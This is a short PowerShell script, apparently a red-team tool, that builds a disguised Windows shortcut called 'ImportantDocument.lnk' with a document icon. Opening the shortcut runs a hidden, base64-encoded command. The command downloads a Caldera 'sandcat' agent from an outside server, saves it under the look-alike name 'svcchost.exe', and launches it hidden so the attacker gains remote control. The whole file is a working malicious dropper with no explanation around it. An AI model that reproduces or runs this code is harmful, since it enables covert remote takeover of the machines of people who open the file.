$payload='$server="http://www.whiterabbitsec.com:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\svcchost.exe"} | stop-process -f;
rm -force "C:\Users\Public\svcchost.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\svcchost.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\svcchost.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;'
$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

$path=".\ImportantDocument.lnk"
$wshell = New-Object -ComObject Wscript.Shell
$shortcut = $wshell.CreateShortcut($path)

$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-nop -w hidden -enc $ENCODED"
$shortcut.WorkingDirectory = "C:"
$shortcut.Description = "Nope, not malicious"

$shortcut.WindowStyle = 7

$shortcut.Save()